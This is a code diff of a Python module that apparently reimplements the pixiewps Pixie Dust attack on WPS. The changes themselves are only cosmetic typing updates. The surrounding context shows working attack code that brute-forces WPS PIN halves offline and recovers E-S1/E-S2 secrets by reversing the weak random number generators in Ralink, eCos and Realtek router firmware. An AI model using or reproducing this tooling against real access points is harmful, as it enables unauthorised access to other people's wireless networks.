@@ -16,11 +16,10 @@ marked "Not tested" by the reference authors — kept for completeness.
 
 from __future__ import annotations
 
-import hmac
 import hashlib
+import hmac
 import time
 from dataclasses import dataclass
-from typing import Optional
 
 # ── constants (from pixiewps/wps.h) ──────────────────────────────────────────
 _NONCE_LEN = 16        # E-Nonce / E-S1 / E-S2 byte length
@@ -176,7 +175,7 @@ def _pin_checksum(first7: int) -> int:
 
 
 def _crack_first_half(auth_key: bytes, es1: bytes, pke: bytes, pkr: bytes,
-                      e_hash1: bytes) -> Optional[str]:
+                      e_hash1: bytes) -> str | None:
     """Brute-force first 4 digits of WPS PIN (0000-9999). Returns '0000'-'9999' or None."""
     empty_psk = hmac.new(auth_key, b"", hashlib.sha256).digest()[:_PSK_LEN]
     if _check_hash(auth_key, es1, empty_psk, pke, pkr, e_hash1):
@@ -190,7 +189,7 @@ def _crack_first_half(auth_key: bytes, es1: bytes, pke: bytes, pkr: bytes,
 
 
 def _crack_second_half(auth_key: bytes, es2: bytes, pke: bytes, pkr: bytes,
-                       e_hash2: bytes, first_half: str) -> Optional[str]:
+                       e_hash2: bytes, first_half: str) -> str | None:
     """Brute-force second 4 digits. first_half may be '' for empty-PIN case."""
     if not first_half:
         empty_psk = hmac.new(auth_key, b"", hashlib.sha256).digest()[:_PSK_LEN]
@@ -208,7 +207,7 @@ def _crack_second_half(auth_key: bytes, es2: bytes, pke: bytes, pkr: bytes,
 
 def crack_pin_from_secrets(auth_key: bytes, es1: bytes, es2: bytes,
                            pke: bytes, pkr: bytes,
-                           e_hash1: bytes, e_hash2: bytes) -> Optional[str]:
+                           e_hash1: bytes, e_hash2: bytes) -> str | None:
     """Given E-S1/E-S2, crack the full WPS PIN offline. Returns 8-digit string or None."""
     first = _crack_first_half(auth_key, es1, pke, pkr, e_hash1)
     if first is None:
@@ -222,7 +221,7 @@ def crack_pin_from_secrets(auth_key: bytes, es1: bytes, es2: bytes,
 # ── Mode implementations ──────────────────────────────────────────────────────
 
 def _try_rt(e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
-            e_hash1: bytes, e_hash2: bytes) -> Optional[str]:
+            e_hash1: bytes, e_hash2: bytes) -> str | None:
     """Ralink LFSR: reverse from E-Nonce to find E-S1/E-S2 preceding it."""
     # Special case: E-S1 = E-S2 = 0x00 * 16
     zero = bytes(16)
@@ -260,7 +259,7 @@ def _try_rt(e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
 
 
 def _try_ecos(prng_fn, e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
-              e_hash1: bytes, e_hash2: bytes, search_bits: int = 32) -> Optional[str]:
+              e_hash1: bytes, e_hash2: bytes, search_bits: int = 32) -> str | None:
     """Generic ECOS search: seed produces E-Nonce then E-S1 then E-S2.
 
     For ECOS_SIMPLE (search_bits=25):
@@ -329,7 +328,7 @@ def _try_ecos(prng_fn, e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
 
 def _try_rtl(e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
              e_hash1: bytes, e_hash2: bytes,
-             timestamp: Optional[int] = None) -> Optional[str]:
+             timestamp: int | None = None) -> str | None:
     """Realtek RTL819x: E-S1 = E-S2 = E-Nonce is the fast path; time-seed is the real path."""
     # Fast path: E-S1 = E-S2 = E-Nonce (seen in auto mode)
     pin = crack_pin_from_secrets(auth_key, e_nonce, e_nonce,
@@ -341,7 +340,7 @@ def _try_rtl(e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
     if timestamp is None:
         timestamp = int(time.time())
 
-    def try_seed(seed: int) -> Optional[str]:
+    def try_seed(seed: int) -> str | None:
         nonce_candidate = _rtl_nonce_fill(seed)
         # E-Nonce must have MSB clear in bytes 0,4,8,12 (RTL filter from pixiewps)
         if (e_nonce[0] & 0x80) or (e_nonce[4] & 0x80) or \
@@ -374,8 +373,8 @@ def _try_rtl(e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
 
 @dataclass
 class PixieResult:
-    pin: Optional[str]
-    mode: Optional[str]    # "RT", "ECOS_SIMPLE", "RTL819x", "ECOS_SIMPLEST", "ECOS_KNUTH"
+    pin: str | None
+    mode: str | None    # "RT", "ECOS_SIMPLE", "RTL819x", "ECOS_SIMPLEST", "ECOS_KNUTH"
 
 
 def pixie_dust(
@@ -385,7 +384,7 @@ def pixie_dust(
     pkr: bytes,
     e_hash1: bytes,
     e_hash2: bytes,
-    timestamp: Optional[int] = None,
+    timestamp: int | None = None,
 ) -> PixieResult:
     """Run all pixie-dust modes in priority order.
 
